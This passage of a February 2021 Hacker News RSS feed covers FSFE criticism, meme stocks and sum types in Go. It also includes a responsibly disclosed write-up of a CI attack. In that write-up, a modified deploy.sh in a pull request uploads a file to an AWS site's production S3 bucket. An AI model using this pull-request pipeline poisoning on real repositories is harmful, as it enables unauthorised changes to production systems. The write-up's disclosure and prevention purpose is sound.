            <link>https://www.borealisai.com/en/blog/aiden-reinforcement-learning-for-order-execution/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26193416</guid>
            <pubDate>Fri, 19 Feb 2021 14:21:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My Take on What I Would Replace FSFE With]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26193395">thread link</a>) | @rhabarba
<br/>
February 19, 2021 | https://flameeyes.blog/2021/02/16/my-take-on-what-i-would-replace-fsfe-with/ | <a href="https://web.archive.org/web/*/https://flameeyes.blog/2021/02/16/my-take-on-what-i-would-replace-fsfe-with/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>So it looks like my quick, but on-the-spot <a href="https://flameeyes.blog/2020/12/22/i-no-longer-support-fsfe/">renegation of FSFE</a> last December made the round much further than most of the blog posts I ever write. I think that, in comparison, it made a much wider range than my original <a href="https://flameeyes.blog/2010/02/10/i-do-support-fsfe-it-s-positive/">FSFE support post</a>.</p>



<p>So I thought it would be worth spending a little more time to point out <em>why</em> I decided to openly stop supporting FSFE ‚Äî I did provide most of this reasoning in short form on Twitter, but I thought this is better summarised in a blog post that others can reference, and that I can point people at.</p>



<p>So first of all, this is <strong>not all about the allegations</strong>. It was very easy to paint my post, and all the other critical outbursts against FSFE, as a position taken on hearsay. But as I already said, this was just the ‚Äúflash trigger‚Äù of me calling back the support for an organization for which my feeling cooled down significantly for <em>years</em>. Again, I said already in the other post that I got in touch with Matthias a few years ago already about my concerns with the organization, and it was <a href="https://flameeyes.blog/2017/09/14/public-money-public-code/">Public Money, Public Code</a> that kept me as a supporter since then.</p>



<p>The reason why I decided to write renege my support when the allegations were extended, and I even changed my posts schedule for it, is that I didn‚Äôt want my (much older) post on supporting FSFE to be used as an excuse to support an organization that was in the middle of a controversy. I have been a strong supporter and have been talking people about FSFE for years, including about their more recent <a href="https://flameeyes.blog/2020/04/23/reuse-simplifying-code-licensing/">REUSE initiative last year</a>, and I wouldn‚Äôt have wanted to be used as a shield from criticism.</p>



<p>I had an entire draft complaining about the way FSFE made me feel most like I was supporting FSFG (Free Software Foundation Germany), and that doesn‚Äôt seem to have changed <em>that</em> much since I wrote it two years ago. Both the news page and the activities page at the time of writing are clearly highlighting a tight focus on German issues, including talking in very broad strokes about how the <a href="https://fsfe.org/news/nl/nl-202012.en.html">German Corona Warn App doesn‚Äôt need Google</a> ‚Äì strokes so broad that make it feel like a lot of smoke and no meat underneath ‚Äì and still more focus on dealing with router lock-ins (<a href="https://flameeyes.blog/2016/12/05/ethical-implications-of-selling-routers/">missing a lot of nuance</a>).</p>



<p>I do understand that, if most of the volunteers engaging are German they will care about German issues the most, and that if the ‚Äúwins‚Äù come from Germany, obviously the news will be filled with German wins. But at the same time, an organization that wants to be European should strive to have some balance and decide <em>not</em> to use all the news coming from a single country. Looking at the news archive page at the time I‚Äôm writing this post, there‚Äôs seven references to ¬´Germany¬ª, one to ¬´France¬ª, and none to ¬´Italy¬ª, ¬´Ireland¬ª, ¬´United Kingdom¬ª, ¬´Great Britain¬ª, and so on.</p>



<p>And it‚Äôs not that there‚Äôs <em>nothing</em> happening in those other countries. <a href="https://en.wikipedia.org/wiki/COVID_Tracker_Ireland">COVID Tracker Ireland</a>, to stay in the topic of Covid tracing apps, is also Free Software (licensed under MIT license), and a number of other apps have been literally built based on its code. <em>Public Money, Public Code</em> to its best! But nothing about it on the FSFE‚Äôs website, while there‚Äôs a number of references to the German app instead.</p>



<p>And again speaking of <em>Public Money, Public Code</em>, Italy doesn‚Äôt seem to be represented at all in their list of news, with the only reference being a two years old entry about ‚ÄúFSFE Italy‚Äù asking for support to the project by political parties. This despite the fact that the Italian <em>Team Digitale</em> and the established pagoPA company have been also <a href="https://github.com/pagopa">releasing a lot of Free Software</a>.</p>



<p>Once again, if you want to change the direction of an organization, joining directly and ‚Äúwalking the walk‚Äù would help. But there‚Äôs a number of reasons why that might be difficult for people. While I was working for Google ‚Äì a cloud provider, very clearly ‚Äì it would have been fairly difficult for me to join an organization with loud complaints about ‚Äúthe cloud‚Äù (<a href="https://flameeyes.blog/2020/04/30/bakery-someone-else-oven/">which I anyway disagree with</a>). And similarly given the amount of coverage of privacy, even when not related to Free Software directly, it would be hard for me to be an activist given my current employer.</p>



<p>Before you suggest that this is my problem, and that I‚Äôm not the target to such an organization, I want to point out that <em>this is exactly why I didn‚Äôt go and say that they are terrible organization and called for a boycott</em>. I just pointed out that I no longer support them. I did say that, out of my experience, I have no reason to disbelieve their accusation, and even after reading their response statement I don‚Äôt have any reason to change my mind about that.</p>



<p>But I also have been a Free Software developer and advocate for a long time. I believe in the need for more Free Software, and I agree that government-developed software should be released to the public, even if it doesn‚Äôt benefit directly the taxpayers of the government that developed it. I made <a href="https://flameeyes.blog/2009/07/15/pubbliche-amministrazioni-e-software-libero-un-caso-pratico/">that case in Italian</a> over ten years ago (I should possibly translate that blog post or at least re-tell the tale). I would enjoy being an activist for an organization that cares about Free Software, but also cares to get more people onboard rather than fewer, and would rather then not build ‚Äúpurity tests‚Äù into its role.</p>



<p>Another <em>big</em> problem is with the engagement method. Because of the abovementioned purity test, FSFE appears to only be engaging with its community in a ‚Äúwrite only‚Äù media over Twitter. If you want to be an activist for FSFE you need to use email and mailing list, or maybe you can use Mastodon. In-person meetings seemed to still be all the rage when I discussed this a few years ago, and I do wonder if with 2020 happening they manage to switch at least to Jitsi, or if they ended up just using an Asterisk server connected to a number of landlines to call into.</p>



<p>I‚Äôm still partially comfortable with mailing lists for discussion, but it‚Äôs honestly not much of a stretch to see how this particular communication medium is not favorable to younger people. It‚Äôs not just the lack of emoji and GIF reactions ‚Äî it‚Äôs also a long-form medium, where you need to think careful about all the words you use, and that persists over time. And that counts double when you have to handle discussion with an organization that appears to have more lawyers than developers.</p>



<p>I joked on Twitter that for a Gen-Z person, asking to use email to partecipate is the equivalent of asking a Millennial (like me) to make a phone call. And I say that knowing full well how much time I used to spend on the phone when I ran my own company: it‚Äôs not fun to me at all.</p>



<p>But that means you‚Äôre cutting out two big categories of people who <em>could</em> have both the intentions and the means to help: younger people with time on their hand, who can actively partecipate in programs and organization, and professionals who might have the <a href="https://flameeyes.blog/2020/12/15/senior-engineering-open-the-door-move-away/">expertise</a> and the contacts.</p>



<p>And speaking of the professionals ‚Äî you may remember that I came to the REUSE tool (which I contributed a number of fixes to myself) after complaining about having a <a href="https://flameeyes.blog/2020/04/16/making-it-easy-to-contribute-code/">hard time contributing while at Google</a> because projects, among others, often didn‚Äôt provide a proper license that I could refer to, to submit patches. At the time of writing, just like a few years ago when I first tried correcting something on the website, the <a href="https://git.fsfe.org/FSFE/fsfe-website">FSFE Website repository</a> does <strong>not</strong> provide a license or SPDX headers (to comply with REUSE).</p>



<p>What would I like is for an <em>actual</em> European-wide organization, focused not on government policy, but rather on making it possible to have a sustainable ecosystem of Free Software development, particularly when it comes to all of those nuances that differ from a discussion of Free Software and licensing that is always too USA-centric.</p>



<p>The organization I have in mind, that I would <em>love</em> to provide monetary contribution to (if not outright be an activist for, time constraint being a thing), would be spending time in universities and high school, showing the usefulness of Free Software to learn new things. Convincing both professors and students of the usefulness of sharing and receiving, and <em>respecting the licensing</em>.</p>



<p>This is not as obvious: back when I was in high school, <a href="https://en.wikipedia.org/wiki/BSA_(The_Software_Alliance)">BSA</a> was the only enforcement of license compliance in schools, and Free Software advocates were explicitly undermining those efforts, as they were working for a few proprietary software manufacturers. But as I <a href="https://flameeyes.blog/2009/09/23/who-pays-the-price-of-pirated-programs/">said before</a>, undermining proprietary software licenses undermines the Free Software movement. If people are trained to ignore licensing requirements, they are going to do so for Free Software, and that‚Äôs now you end up with projects ignoring the limits of GPL and other licenses.</p>



<p>And this connects to the next problem: for the movement to be sustainable, you also need people to <a href="https://flameeyes.blog/2010/04/09/making-money-with-free-software-development/">make a living off it</a>, and that requires <a href="https://flameeyes.blog/2010/07/11/a-personal-experience-on-why-the-floss-movement-cripples-itself/">taking licensing seriously</a>. It‚Äôs a topic I come back over and over: <a href="https://flameeyes.blog/2018/05/04/case-study-the-pizzeria-crm/">business-oriented Free Software is already lacking</a>, and people need money to survive. When the option for more experience developers, project managers, community managers, ‚Ä¶ is basically to barely make ends meet or go work for one of the big companies that <em>don‚Äôt</em> focus on Free Software‚Ä¶ well the answer is obvious for a lot more people you may imagine. Not everyone gets to be the ‚Äústar‚Äù that Greg KH or Linus Torvalds are, and get paid to pretty much keep their Free Software engagement ‚Äî most others either do it as a side hustle, or <em>have</em> a side hustle.</p>



<p>The Document Foundation <a href="https://blog.documentfoundation.org/blog/2020/07/20/update-on-marketing-and-communication-plans-for-the-libreoffice-7-x-series/">found out the hard way</a> that there‚Äôs need for actual business plans if you want to keep maintaining big, complex Free Software projects. And even Mozilla, once shown as a core pillar of Free Software paid development, has shown this year how hard it is to keep ‚Äúrunning the show‚Äù without a sustainable plan on the long term.</p>



<p>An organization focused on sustainability in Free Software should, at least in my hopes, focus on providing this kind of support. Providing blueprints for business engagements, providing outreach on license ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://flameeyes.blog/2021/02/16/my-take-on-what-i-would-replace-fsfe-with/">https://flameeyes.blog/2021/02/16/my-take-on-what-i-would-replace-fsfe-with/</a></em></p>]]>
            </description>
            <link>https://flameeyes.blog/2021/02/16/my-take-on-what-i-would-replace-fsfe-with/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26193395</guid>
            <pubDate>Fri, 19 Feb 2021 14:20:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Build Pipeline Security]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26193349">thread link</a>) | @some_furry
<br/>
February 19, 2021 | https://sprocketfox.io/xssfox/2021/01/18/pipeline/ | <a href="https://web.archive.org/web/*/https://sprocketfox.io/xssfox/2021/01/18/pipeline/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
    <article>
      
  <p><em>This occurred on an AWS website (not a site hosted on AWS, but a site run by AWS). It shows that security is hard, even for a $51 billion business. This issue can occur not just on websites but even SDKs and libraries</em></p>
<p><img src="https://sprocketfox.io/xssfox/pipeline/erik-mclean-TNjdgCBRMeU-unsplash.jpg" alt="Fox smelling the road"></p>
<blockquote>
<p>üì∏ Erik Mclean via unsplash</p>
</blockquote>
<p>While developers have a keen nose for <a href="https://en.wikipedia.org/wiki/Code_smell">code smells</a> us operations types have a keen nose for infrastructure smells. When I opened this git repository for first time it hit me. A <code>buildspec.yml</code> file.</p>
<h3 id="the-humble-buildspecyml">The humble <code>buildspec.yml</code></h3>
<p>For those unfamiliar, <code>buildspec.yml</code> is used by a service called <a href="https://docs.aws.amazon.com/codebuild/latest/userguide/build-spec-ref.html">CodeBuild</a> and basically defines the steps used to build a project, including running shell commands. It‚Äôs basically remote code execution as a service.</p>
<p>The presence of this file in a repository isn‚Äôt call for alarm, but when it‚Äôs in a public repository it certainly raises red flags. The usual concern is someones committed some secret credentials into this file. In this case the file was clean of credentials.</p>
<p>All good right? Not so fast.</p>
<p><img src="https://sprocketfox.io/xssfox/pipeline/lachlan-gowen-cWwqwN2uTo4-unsplash.jpg" alt="Fox sleeping"></p>
<blockquote>
<p>üì∏ Lachlan Gowen via unsplash</p>
</blockquote>
<h3 id="notices-your-deploysh"><em>notices your <code>deploy.sh</code></em></h3>
<p>The <code>buildspec.yml</code> referenced a <code>deploy.sh</code>. This is when I verbally said ‚Äúoh no‚Äù. Like before no secrets committed. A good start. <code>deploy.sh</code> contains instructions to deploy out the project - like <code>aws s3 sync</code> and the like, so we can determine that when this gets run it has access to upload to the production site.</p>
<p><img src="https://sprocketfox.io/xssfox/pipeline/nathan-anderson-3Lazy6QQR6c-unsplash.jpg" alt="Fox yelling"></p>
<blockquote>
<p>üì∏ Nathan Anderson via unsplash</p>
</blockquote>
<p>The issue here is that the <code>buildspec.yml</code> and <code>deploy.sh</code> could be modified by a malicious user.</p>
<h3 id="the-pull-request">The pull request</h3>
<p>However malicious user doesn‚Äôt have access to commit to the repository and an admin isn‚Äôt going to merge malicious code, so this is no big deal right? Let‚Äôs see what happens when we lodge a pull request.</p>
<p>Upon creation of the pull request GitHub triggers a CodeBuild job. This is a fairly common practice to make sure nothing in the pull request breaks the build. What prevents the pull request build from deploying to production? Lets check <code>deploy.sh</code></p>
<div><pre><code data-lang="sh"><span>if</span> <span>[[</span> <span>"</span>$CODEBUILD_WEBHOOK_HEAD_REF<span>"</span> <span>==</span> <span>"refs/heads/main"</span> <span>&amp;&amp;</span> <span>${</span>CODEBUILD_SOURCE_VERSION:0:3<span>}</span> !<span>=</span> <span>"pr/"</span> <span>]]</span>; <span>then</span>
</code></pre></div><p>oh no.</p>
<p>So deployment is purely controlled by a script that can be changed in the pull request.</p>
<p><img src="https://sprocketfox.io/xssfox/pipeline/scott-walsh-7LzKELgdzzI-unsplash.jpg" alt="Fox in grass"></p>
<blockquote>
<p>üì∏ Scott Walsh via unsplash</p>
</blockquote>
<h3 id="one-last-chance">One last chance</h3>
<p>At this stage we‚Äôve got remote code execution into the pipeline. Apart from <a href="https://www.vice.com/en/article/nzkxgm/bitcoin-mining-github-open-source-bots">mining some Bitcoin</a> this is pretty uneventful. What about the S3 sync we mentioned earlier? It‚Äôs possible that the role granted for pull requests is the same role used for deploying to production, so lets check it out.</p>
<p>I edited the shell script to have my code right at the start ‚Ä¶</p>
<div><pre><code data-lang="sh">echo <span>"testing a security issue"</span> &gt; test.html
aws s3 cp test.html s3://target_bucket/test.html
aws cloudfront create-invalidation --distribution-id $CLOUDFRONT_DIST_ID --paths <span>"/*"</span>
exit <span>1</span>
</code></pre></div><blockquote>
<p><code>target_bucket</code> value was recovered from original <code>deploy.sh</code></p>
</blockquote>
<p>‚Ä¶ and lodged a pull request. I checked the website and sure enough my file was there. üòÆ</p>
<p><img src="https://sprocketfox.io/xssfox/pipeline/nathan-anderson-XHK0JdmJxJc-unsplash.jpg" alt="Fox licking lips"></p>
<blockquote>
<p>üì∏ Nathan Anderson via unsplash</p>
</blockquote>
<h3 id="it-doesnt-end-there">It doesn‚Äôt end there</h3>
<p>It‚Äôs quite possible that the role used for deployment might have access to lots of interesting things, a private subnet, IAM admin, CloudFormation. I didn‚Äôt check further than this and submitted a disclosure reported to the security team immediately.</p>
<h3 id="prevention">Prevention</h3>
<p>If you still want pull requests to trigger builds on a public repository there a couple of things you can do to limit risk.</p>
<p>Place build scripts in a separate repo. Some build tools let you specify a separate repo to use for the build pipeline. Be careful though as this doesn‚Äôt guarantee that the project build can‚Äôt execute commands, depending on the programming language and build tools.</p>
<p>For services like CodeBuild you can utilize a separate IAM role for pull requests which is limited to just build requirements. Make sure the build agents for PRs aren‚Äôt within a a trusted network.</p>




      
        
      
    </article>
    
    
      

    
  </div></div>]]>
            </description>
            <link>https://sprocketfox.io/xssfox/2021/01/18/pipeline/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26193349</guid>
            <pubDate>Fri, 19 Feb 2021 14:15:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Rise of Meme Stocks: How Viral Trading Hit High Gear in Early 2021]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26193348">thread link</a>) | @maldinii
<br/>
February 19, 2021 | https://finmasters.com/the-rise-of-meme-stocks/ | <a href="https://web.archive.org/web/*/https://finmasters.com/the-rise-of-meme-stocks/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-3575"> <p>Meme stocks ‚Äì the pincushion point where viral marketing merges with Wall Street ‚Äì is creating a buzz of its own among investors across the board in 2021. Legions of retail traders, many of them young people fortified by zero commission trades and easy access to markets, are testing the limits of traditional equity trading structures as they seek quick scores via trading patterns based on viral marketing.</p><p>Some market watchers, including the regulators paid to ensure fair trading markets, see the creation of a potential monster in the elevation of meme stocks like GameStop (GME), AMC Entertainment (AMC), and Blackberry (BB), among other brand name stocks. That sentiment hasn‚Äôt dissuaded digital trading enthusiasts, and millions of investors have flocked to meme stocks.</p><div id=""><p><strong>Case in point:</strong> A new study by <a href="https://theharrispoll.com/viral-stocks-gamestop/" target="_blank" rel="noreferrer noopener">The Harris Poll</a> reported that over 25% of U.S. investors said they purchased at least one or more viral stocks since the start of the new year.</p></div><h2>Spot the Trends</h2><p>The Harris survey helps clarify the meme stock narrative among investors, with these trends at the top of the survey‚Äôs list:</p><ul><li><strong>Younger men dominate</strong>. Demographically, younger men were most likely to buy meme stocks, with 40% of those ages 18-44 and 40% of men buying shares, compared to 17% of those 45-plus investors and 16% of women.</li><li><strong>Investments are typically small</strong>. Investors seem to be reluctant to steer too much money into meme stocks. Harris noted that about 50% half of meme investors who purchased viral stocks in January kept their total investments in viral stocks ‚Äúrelatively small.‚Äù 53% of those investors invested $250 or less in viral stocks. Only 15% invested more than $1,000.</li><li><strong>Trades are short term</strong>. Most meme stock investors are only in it for the short-term. ‚ÄúOf those who bought GameStop stock this past January, 56% also sold shares in January,‚Äù Harris reported. ‚ÄúOf those who still have remaining shares, a third (34%) plan to hold their position for less than a month.‚Äù</li><li><strong>Social media and internet forums</strong> are the main drivers of viral stocks. The Harris survey tags social media (35%) as the leading viral stock meeting place, with Twitter a particular hot spot. Viral stock traders favor digital trading forums (32%) like Reddit‚Äôs <a href="https://www.reddit.com/r/wallstreetbets/" target="_blank" rel="noreferrer noopener">r/wallstreetbets</a> forum while traditional news media (31%) follow as the ‚Äútop three‚Äù influences for meme stock buyers. (At the bottom of that market influencer‚Äôs list were financial advisors ‚Äì only 20% of meme stock buyers purchased a viral stock on the advice of a financial advisor.)</li><li><strong>Research is out of style</strong>. Meme investors aren‚Äôt as interested in doing the due diligence necessary to make stock market decisions. ‚ÄúDespite the national buzz around viral stocks and the broader stock market, only a third of Americans (36%) have been interested enough to study how the U.S. financial system (e.g., banks, insurance companies, stock exchanges) and markets (e.g., primary markets/IPOs, secondary markets/stock markets) work‚Äù.</li></ul><p>Motivations for purchasing meme stocks vary. Many investors active on social media say that they aren‚Äôt interested in gains and merely wish to participate in a short squeeze targeting hedge funds. Others expect to earn a quick profit from volatile stocks. What both have in common is the use of modern trading technology and reliance on social media for communication with other traders.</p><h2><strong>Trading Technology That Fits the Younger Lifestyle</strong></h2><div><p>As the Harris study shows, younger investors are increasingly viewing stock trading as a natural extension of their digital lifestyles.</p></div><p>A major <a href="https://static1.squarespace.com/static/5edeedaed417cb4da8b5864a/t/600fabd7798adf0f9c20e9be/1611639767955/%5BHCCG%5D+Consumer+Finance+Report.pdf" target="_blank" rel="noreferrer noopener">study on consumer finance</a> issues released by Harvard College Consulting Group in January 2021, describes how digital technology has fueled interest in stock market trading among younger Americans ‚Äì and has created the no-commission trades and fractional shares trading landscape that fits the lifestyle of younger investors.</p><p>‚ÄúOver the past ten years, the emergence of new consumer finance technologies and businesses, such as digital-first banks, cryptocurrencies, online stock trading apps, micro-investing apps, and more, have revolutionized the consumer finance industry and enticed growing numbers of young people,‚Äù the report stated. ‚ÄúPlus, the prevalence of mobile banking solutions is only growing, as a Morgan Stanley survey of 6,000 consumers aged 16 to 34 in 2018 found that 47% of 16- to 17-year-olds and 71% of 18- to 19-year-olds use mobile apps to help manage their money.‚Äù</p><h3>Apps Make it Easy</h3><p>The study also noted that while younger Americans were only ‚Äúmoderately comfortable‚Äù with the stock market, the pervasiveness and low cost of mobile financial apps used by many younger investors made that trading experience easier and more cost-efficient.</p><p>‚ÄúMobile apps which had zero-commission trading and fractional-share trading, such as Robinhood, took the stock investment space by storm in 2013,‚Äù the Harvard report stated. ‚ÄúRobinhood had 500,000 users in its first year, and the company now reports 13 million users and over $180 million in revenue. In order to compete, companies like Charles Schwab, TD Ameritrade, Ally Invest, and Fidelity have dropped their electronic transfer fees to zero, lowering barriers to entry and making the cost much less of an obstacle to investment, especially for younger generations.‚Äù</p><p>According to the survey, <strong>Robinhood</strong> was the most widely-used investment platform with 19% of respondents having used it, followed by <strong>Fidelity Investments</strong> and <strong>TD Ameritrade</strong>. ‚ÄúWhen asked about important factors considered in their choice of investment platforms, zero-commission stock trading and fractional shares ranked as the most important factors among Gen Z respondents, 55% of whom already trading stocks.‚Äù</p><h2><strong>More Questions Than Answers on Meme Stocks</strong></h2><p>While meme stocks remain in the headlines and at the forefront of investor sentiment in early 2021, a larger question remains for investors who rely on hype rather than fundamentals to drive stock buying decisions.</p><div><p>Can investors really count on meme stocks as stable portfolio contributors, especially given the sources of information that push meme stocks to the front of the investment trading culture?</p></div><div><p>‚ÄúThere‚Äôs good and bad elements tied to viral stocks‚Äù said Asher Rogovy, chief investment officer at <a href="https://www.magnifina.com/" target="_blank" rel="noreferrer noopener">Magnifina</a>, a New York City-based money management firm. ‚ÄúFor instance, because interest rates are so low, there are fewer compelling investments. A meme stock might act as a de facto store of value so long as its forward-looking valuation is somewhat plausible. Yet mis-valued stocks might correct sharply if rising interest rates pop speculative bubbles.‚Äù</p><p>Pulling the lens back further, Rogovy believes it‚Äôs ‚Äúfoolish‚Äù to trust anonymous posts on the internet.</p></div><p>‚ÄúFraudsters may be emboldened to make false claims on anonymous internet forums,‚Äù Rogovy said. ‚ÄúI never fully trust any information that doesn‚Äôt come with a face and a name. On WallStreetBets, I have seen considerable amounts of demonstrably false information being posted and repeated.‚Äù</p><p>Rogovy‚Äôs quote illustrates one of the risks of the meme stock movement. Emotional drivers like the desire to squeeze a hedge fund can deliver non-financial rewards to some participants. They can also bring very real financial gains to stockholder who sell into the frenzy. That creates potential for manipulation, and where that potential exists, it will be exploited.</p><h2><strong>A Repeat of the Wild 1990‚Äôs?</strong></h2><p>Rogovy also believes the recent activity arising from WallStreetBets mirrors the late 1990‚Äôs, when independent online trading first became widespread and message boards like <em>Silicon Investor</em> and <em>Raging Bull</em> became the preferred vehicles for both information and misinformation.</p><p>‚ÄúIt‚Äôs just happening to a different generation,‚Äù he added. ‚ÄúMuch of the misinformation about short squeezes has already been spread in similar events.‚Äù</p><p>Yet there are major distinctions between the late-‚Äô90s tech stock boom and today‚Äôs meme stock surge, and it‚Äôs not good news for retail investors.</p><p>‚ÄúUnlike the 1990s, today‚Äôs retail millennial investor does not invest with the same sort of optimism and ‚Äúirrational exuberance‚Äù that characterized the investing behavior of his or her parents‚Äô generation,‚Äù said Demetri Kofinas, a long-time trader and host of the <a href="https://hiddenforces.io/" target="_blank" rel="noreferrer noopener">Hidden Forces podcast</a>. ‚ÄúPeople buying high-flying internet stocks in the late 90‚Äôs really did believe that they were living in a ‚Äúnew paradigm economy‚Äù and that they were jumping on a train of transformation that was going to leave the legacy economy in the dust.‚Äù</p><p>Kofinas believes that late 1990‚Äôs investors believed they were investing in the future.</p><div><p>‚ÄúToday‚Äôs millennial investor pouring money into Tesla (TSLA) or Uber (UBER) does share some of that exuberance, but this type of optimism is not a market-wide phenomenon, like it was in the 1990‚Äôs,‚Äù he said.</p></div><h2><strong>Optimal Conditions for Meme Investors</strong></h2><p>The emergence of the younger investor who is more likely to pursue viral stocks is hardly an accident. It‚Äôs the end result of dominant technology combining with a global pandemic that kept people at home and looking for online distractions. It‚Äôs up to the masses to entertain themselves during lockdown, and the Reddit-inspired investment army figured they might as well try to make a buck or two ‚Äì or maybe take a whack at a short-selling hedge fund ‚Äì in the process.</p><p>‚ÄúThe emergence of the retail investor, along with stimulus checks and extra time to work from home, is creating a breeding ground for pump and dump stocks,‚Äù said George Papazov, founder of TRADEPRO Academy, a platform that helps at-home traders and investors achieve liftoff.</p><p>While the newest generation of young traders possess its fair share of exuberance, it‚Äôs courting danger as so many younger investors have yet to grasp the downside of focusing on viral stocks.</p><h3>Brains and Bulls</h3><p>‚ÄúThere is a saying among veteran traders that says, ‚Äú<em>don‚Äôt confuse brains for bulls</em>‚Äù, Papazov said. ‚ÄúWhen markets are moving higher at breakneck speed, due to money printing by the Fed and the inflation of paper assets, you can buy just about any stock and make money. But ‚Ä¶</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://finmasters.com/the-rise-of-meme-stocks/">https://finmasters.com/the-rise-of-meme-stocks/</a></em></p>]]>
            </description>
            <link>https://finmasters.com/the-rise-of-meme-stocks/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26193348</guid>
            <pubDate>Fri, 19 Feb 2021 14:15:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Sum Types in Go (2013)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26193008">thread link</a>) | @dgellow
<br/>
February 19, 2021 | http://www.jerf.org/iri/post/2917 | <a href="https://web.archive.org/web/*/http://www.jerf.org/iri/post/2917">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p><nobr>posted Jun 02, 2013</nobr><br>
in <a href="http://www.jerf.org/iri/categories/Programming/">Programming</a>, <a href="http://www.jerf.org/iri/categories/Golang/">Golang</a>, <a href="http://www.jerf.org/iri/categories/Haskell/">Haskell</a></p>






<p>A couple of months back, I analyzed whether I wanted to propose switching to Go for work. I've still technically got the blog post with the results of that analysis in the pipeline (though who knows when I'll get it up), but there's a part of it that keeps coming up online, and I want to get this bit out faster. It's about whether <a href="http://golang.org/">Go</a> has "sum types".</p>
<hr>

<p>A sum type is a type in a language that can have multiple different kinds of values, which themselves may contain values of differing types.</p>

<p>To put it in C terms, it is a "union" in a struct with an element that says which member of the union is currently the active element. In fact the <a href="https://en.wikipedia.org/wiki/Tagged_union">Wikipedia page on the topic</a> lumps the two together. Different elements of the union may have significantly different memory sizes, so languages that make heavy use of this will not use a literal C union, but this gets the idea across.</p>

<p> A classic example is an AST type that defines what a legal abstract syntax tree expression is, pulled from the <a href="http://en.wikibooks.org/wiki/Haskell/GADT">Haskell GADT Wikibook page</a>:</p>

<pre>data Expr a where
   I   :: Int  -&gt; Expr Int
   B   :: Bool -&gt; Expr Bool
   Add :: Expr Int -&gt; Expr Int -&gt; Expr Int
   Mul :: Expr Int -&gt; Expr Int -&gt; Expr Int
   Eq  :: Expr Int -&gt; Expr Int -&gt; Expr Bool</pre>

<p>This says that an expression may be an <tt>I</tt> for Int type, which then contains an Int value, or it may be a <tt>B</tt> that contains a Bool, or it may be an <tt>Add</tt> or <tt>Mul</tt> expression which itself may contain some expression of type Int, or an <tt>Eq</tt> expression. This is all recursive, so <tt>Mul (Add (I 3) (I 4)) (I 5)</tt>, the translation of <tt>(3 + 4) * 5</tt> in traditional infix syntax, is legal.</p>

<p>Good languages support making it impossible to confuse the elements, so you have to "deconstruct" the sum type to do anything with it. Generally associated with a type like this you'll see a base set of functions that run the type through a case statement. Using the above, we can evaluate the expression with:</p>

<pre>eval :: Expr a -&gt; a
eval expr = case expr of
                (I n) -&gt; n
                (B b) -&gt; b
                (Add e1 e2) -&gt; eval e1 + eval e2
                (Mul e1 e2) -&gt; eval e1 * eval e2
                (Eq  e1 e2) -&gt; eval e1 == eval e2</pre>

<p>(I transformed the original into a case statement, for better parallels with Go.)</p>

<p>Sum types are a great example of how learning a different language can expand your mind. If you've never used a language with good support for sum types, they sound worthless; after all, you've made it this far without ever needing explicit support, and you can bodge together something that works if you ever need to. But once you've become fluent in a language that heavily uses them, you'll never stop seeing places where you need them, and you'll miss them badly. Two places where sum types are particularly strong are the aforementioned AST example, and any sort of protocol, where a sum type can easily represent the legal messages that can be received, while excluding by construction any message that can not be received. When this is done, the type system itself helps you correctly handle errors at the outermost level, then pass the messages along to an inner layer that need no longer worry about such basic error handling. It's a good idea anyhow, and having the type system help enforce it is even better.</p>

<p>AST types are presumably forever going to be a marginal case in Go. Nothing stops you from writing a compiler in Go, but it will never be a dominant use case for the language. Protocols, on the other hand, appear <i>everywhere</i>; every <tt>chan</tt> in Go defines a protocol. Often they are quite simple (<tt>chan bool</tt> can only be so complicated), but they can't all be that simple. A serious Go program will be steeped in protocols internally.</p>

<p>But, alas, as is well known, Go does not contain union types. Except, as the <a href="http://golang.org/doc/faq#variant_types">FAQ entry alludes to</a>, it sort of already does. But the FAQ is a faint allusion, and my Googling can't find anyone demonstrating what I consider the correct way (you can do <i>much</i> better than <tt>interface{}</tt>, which seems to be the current <i>de facto</i> standard), so let me show it to you. Let's translate that Expression type into Go.</p>

<pre>package main

import "fmt"

// Rather than a "type", we declare an "interface" for the type
type Expr interface {
	isExpr()
}

// We can't define an implementation of isExpr on int directly, so
// we wrap it
type I int

// And tag it as an "Expr". This function's only point is to do that.
func (i I) isExpr() {}

// And so on:
type B bool
func (b B) isExpr() {}

type Add struct { left Expr; right Expr }
func (a Add) isExpr() {}

type Mul struct { left Expr; right Expr }
func (m Mul) isExpr() {}

type Eq struct { left Expr; right Expr }
func (e Eq) isExpr() {}

func eval (e Expr) (r Expr) {
    switch exp := e.(type) {
        case I: r = exp
        case B: r = exp
        case Add: r = I(eval(exp.left).(I) + eval(exp.right).(I))
        case Mul: r = I(eval(exp.left).(I) * eval(exp.right).(I))
        case Eq: r = B(eval(exp.left).(I) == eval(exp.right).(I))
    }
    return
}

func main () {
    fmt.Println("4 + 5: ", eval(Add{I(4), I(5)}))
    fmt.Println("(3 + 2) * 2: ", eval(Mul{Add{I(3), I(2)}, I(2)}))
    // you'll never see this output:
    fmt.Println("Runtime error: ", eval(Add{I(3), B(true)}))
}</pre>

<p>You can try that on the <a href="http://play.golang.org/p/sBrG1UfWs4">Go Playground</a>, or if that is ever removed, paste that into a file and run with "go run". (I deliberately condensed the code for blog-readability, hit "Format" on the playground if you want to see the official formatting.)</p>

